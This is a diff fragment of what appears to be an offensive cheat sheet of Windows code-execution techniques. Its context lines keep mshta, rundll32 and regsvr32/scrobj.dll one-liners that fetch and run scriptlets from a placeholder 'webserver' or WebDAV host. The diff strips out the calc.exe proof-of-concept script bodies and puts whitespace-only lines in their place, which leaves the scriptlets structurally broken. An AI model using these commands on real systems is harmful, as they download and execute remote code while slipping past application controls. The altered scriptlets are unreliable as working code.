@@ -170,12 +170,7 @@ Payload written on disk: **WebDAV client local cache**
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
 <scriptlet>
-<public>
-</public>
-<script language="JScript">
-<![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-]]>
+                                                                                                                                 
 </script>
 </scriptlet>
 ```
@@ -224,12 +219,7 @@ Payload written on disk: **IE local cache**
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
 <scriptlet>
-<public>
-</public>
-<script language="JScript">
-<![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-]]>
+                                                                                                                                 
 </script>
 </scriptlet>
 ```
@@ -280,13 +270,7 @@ Payload written on disk: **WebDAV client local cache**
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
 <scriptlet>
-<registration 
-    progid="PoC"
-    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-    <script language="JScript">
-        <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
-        ]]>
+                                                                                                                                                                                                                                      
 </script>
 </registration>
 </scriptlet>
